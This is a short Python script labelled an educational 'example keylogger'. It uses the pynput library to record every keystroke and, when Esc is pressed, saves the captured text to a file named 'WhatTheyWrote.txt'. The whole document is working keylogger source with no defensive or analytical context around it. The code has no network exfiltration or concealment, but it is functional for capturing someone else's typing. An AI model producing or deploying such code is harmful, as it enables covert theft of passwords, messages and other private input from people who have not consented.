#!/usr/bin/env python3

##########################
###  EXAMPLE KEYLOGGER ###
###      BY TECOED     ###
###   EDUCATION ONLY   ###
##########################

from time import sleep
from pynput import keyboard
global WhatWasTyped
global final_chars

WhatWasTyped = []
final_chars = ""

#### write string of text to a file ###
#######################################

def write_to_file():
    global final_chars
    global WhatWasTyped
    
    #Join the list and convert to a string
    final_chars = "".join(map(str, WhatWasTyped))
    final_chars  = final_chars.replace("''", "") #what  a pain
     
    f = open("WhatTheyWrote.txt", "w")
    f.write(str(final_chars))
    f.close()

####         read key input         ###
#######################################    
   
def on_press(key):
    global WhatWasTyped
      
    key = str(key)
    
    if key == str("Key.space"): # checks for spacebar
        key = (" ")
    elif key == str("Key.enter"): # checks for return
        key = ("\\")    
    else:
        pass

    WhatWasTyped.append(str(key))
    
def on_release(key):
    if str(key) == 'Key.esc':
        write_to_file()
        return False

with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()


